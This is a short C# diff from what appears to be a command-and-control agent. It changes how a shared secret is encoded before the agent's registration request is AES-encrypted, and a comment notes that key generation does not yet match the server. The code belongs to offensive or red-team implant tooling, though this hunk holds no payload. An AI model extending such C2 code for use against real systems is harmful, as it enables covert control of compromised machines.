@@ -86,7 +86,7 @@ var registerRequest = new C2Request
     Message = JsonSerializer.Serialize(agentInfo)
 };
 
-var encryptedRegisterRequestMessage = aesEncryptionDecorator.Transform(JsonSerializer.Serialize(registerRequest), JsonSerializer.Serialize(sharedSecret));
+var encryptedRegisterRequestMessage = aesEncryptionDecorator.Transform(JsonSerializer.Serialize(registerRequest), Convert.ToBase64String(sharedSecret));
 
 // TODO: Need to fix the secret key gen to match server
 string secretByteString = "[" + string.Join(" ", sharedSecret.Select(b => b.ToString())) + "]";
